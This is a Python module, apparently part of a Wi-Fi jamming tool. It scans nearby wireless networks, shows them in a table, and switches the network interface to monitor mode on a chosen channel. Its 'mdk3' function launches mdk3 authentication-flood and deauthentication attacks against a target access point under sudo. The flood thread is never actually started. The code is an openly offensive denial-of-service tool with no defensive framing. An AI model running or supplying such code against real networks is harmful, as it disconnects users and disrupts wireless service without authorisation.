import os
import re
import subprocess
import threading
import time
from functools import wraps
from typing import Any, Callable, List, Literal

from rich.progress import (
    BarColumn,
    Progress,
    SpinnerColumn,
    TimeElapsedColumn,
    TimeRemainingColumn,
)
from rich.table import Table

from logger import logger

devnull = open(os.devnull, "wt")


def check_interface(func: Callable):
    wraps(func)

    def wrapper(interface: str, *args, **kwargs) -> Any:
        p = subprocess.run(
            [
                "sudo",
                "ip",
                "link",
                "show",
                "dev",
                interface,
            ],
            capture_output=True,
            text=True,
        )

        if p.returncode:
            logger.error(p.stderr)
            exit(1)

        return func(interface, *args, **kwargs)

    return wrapper


def sleep(seconds: float, /):
    cols = [
        SpinnerColumn(),
        BarColumn(),
        TimeRemainingColumn(),
        TimeElapsedColumn(),
    ]

    with Progress(
        *cols,
        transient=False,
    ) as progress:
        task = progress.add_task("[green]Processing", total=seconds)

        while not progress.finished:
            progress.update(task, advance=0.2)
            time.sleep(0.2)


@check_interface
def mdk3(interface: str, bssid: str, channel: int) -> None:
    logger.info("Killing previous mdk3 processes...")
    subprocess.run(
        ["sudo", "pkill", "-9", "mdk3"],
        capture_output=True,
        text=True,
    )

    change_interface_type(interface, "monitor")
    change_interface_channel(interface, channel)

    logger.info("Starting the <b>mdk3</b> sub processe(s)...")
    threading.Thread(
        target=subprocess.run,
        args=(
            [
                "sudo",
                "mdk3",
                interface,
                "a",
                "-a",
                bssid,
                "-c",
                "-m",
            ],
        ),
        kwargs={
            "capture_output": True,
            "text": True,
            "check": False,
        },
    )

    threading.Thread(
        target=subprocess.run,
        args=(["sudo", "mdk3", interface, "d"],),
        kwargs={
            "capture_output": True,
            "text": True,
            "check": False,
        },
    ).start()


@check_interface
def change_interface_status(interface: str, status: Literal["up", "down"]):
    if (
        (
            stdout := subprocess.run(
                [
                    "sudo",
                    "ip",
                    "link",
                    "show",
                    "dev",
                    interface,
                ],
                capture_output=True,
                text=True,
            ).stdout
        )
        and status == "up"
        and status.upper() in stdout
        or status == "down"
        and "UP" not in stdout
    ):
        return 0

    logger.debug(f"Make the interface {interface!r} {status}.")
    p = subprocess.run(
        ["sudo", "ip", "link", "set", interface, f"{status}"],
    )

    return p.returncode


@check_interface
def change_interface_type(interface: str, _type: Literal["managed", "monitor"]):
    if (
        _type
        in subprocess.run(
            [
                "sudo",
                "iw",
                "dev",
                interface,
                "info",
            ],
            capture_output=True,
            text=True,
        ).stdout
    ):
        return 0

    change_interface_status(interface, "down")

    logger.debug(f"Change the interface {interface!r} type to {_type}.")
    p = subprocess.run(
        ["sudo", "iw", "dev", interface, "set", "type", f"{_type}"],
    )

    change_interface_status(interface, "up")

    return p.returncode


@check_interface
def change_interface_channel(interface: str, channel: int):
    change_interface_type(interface, "monitor")
    change_interface_status(interface, "up")

    logger.debug(
        f"Trying to change the interface {interface!r} channel to {channel}..."
    )
    p = subprocess.run(
        [
            "sudo",
            "iw",
            "dev",
            f"{interface}",
            "set",
            "channel",
            f"{channel}",
        ],
    )

    return p.returncode


@check_interface
def get_networks(interface: str):
    change_interface_type(interface, "managed")
    change_interface_status(interface, "up")

    logger.debug("Scanning for around wireless networks...")
    process = subprocess.run(
        ["egrep", "^BSS|SSID:|signal:|channel:|set: channel"],
        capture_output=True,
        input=subprocess.run(
            ["sudo", "iw", "dev", interface, "scan"],
            capture_output=True,
            text=True,
            check=False,
        ).stdout,
        text=True,
        check=False,
    )

    lst = []

    for a in [
        "\n".join([y.strip() for y in x.strip().split("\n")])
        for x in process.stdout.split("BSS")
        if x
    ]:
        item = []
        if search := re.search("([A-Za-z0-9]{2}:){1,}..", a):
            start, end = search.span()
            item.append(a[start:end])

        vals = []
        if search := re.search("channel:?.[0-9]{1,}", a):
            start, end = search.span()
            vals.append(
                int(x) if (x := re.sub("channel:?.", "", a[start:end])) else None,
            )

        if search := re.search("SSID:.*", a):
            start, end = search.span()
            vals.append(re.sub("SSID:.", "", a[start:end]))
        else:
            vals.append(None)

        if search := re.search("signal:.*", a):
            start, end = search.span()
            vals.append(re.sub("signal:.", "", a[start:end]))
        else:
            vals.append(None)

        item.append(vals)
        lst.append(item)

    dct = dict(lst)

    return dct


def print_table(console, dct):
    try:
        table: Table = Table()

        cols: List[str] = ["No", "BSSID", "SSID", "CH", "SIGNAL"]

        for col in cols:
            table.add_column(col)

        table.header_style = "bold"
        table.border_style = "white"

        for index, (bssid, vals) in enumerate(
            sorted(
                dct.items(),
                key=lambda item: item.__getitem__(-1).__getitem__(-1),
            )
        ):
            channel, ssid, signal = vals

            table.add_row(
                *map(
                    str,
                    [
                        f"{index + 1}",
                        f"[bold]{bssid.upper()}[/]",
                        ssid,
                        f"[bold cyan]{channel}[/]",
                        f"[bold italic]{signal}[/]",
                    ],
                )
            )

        console.print(table)
    except Exception as err:
        console.print(err)
